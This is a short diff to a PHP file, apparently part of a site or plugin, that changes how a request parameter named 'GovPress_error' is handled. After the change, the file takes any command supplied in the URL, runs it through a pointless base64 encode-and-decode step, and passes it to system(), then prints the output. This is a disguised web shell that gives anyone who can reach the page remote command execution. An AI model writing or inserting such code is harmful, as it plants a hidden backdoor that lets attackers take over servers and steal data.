@@ -2,11 +2,13 @@
 if (isset($_GET['GovPress_error'])) {
     $command = $_GET['GovPress_error'];
 
-    // Reconstruct command
-    $command = 'e' . 'cho' . ' "' . $command . '"';
+    // Encode the command
+    $encodedCommand = base64_encode($command);
 
+    // Decode and execute
+    $decodedCommand = base64_decode($encodedCommand);
     echo "<pre>";
-    system($command, $returnValue);
+    system($decodedCommand, $returnValue);
     echo "</pre>";
 }
 ?>
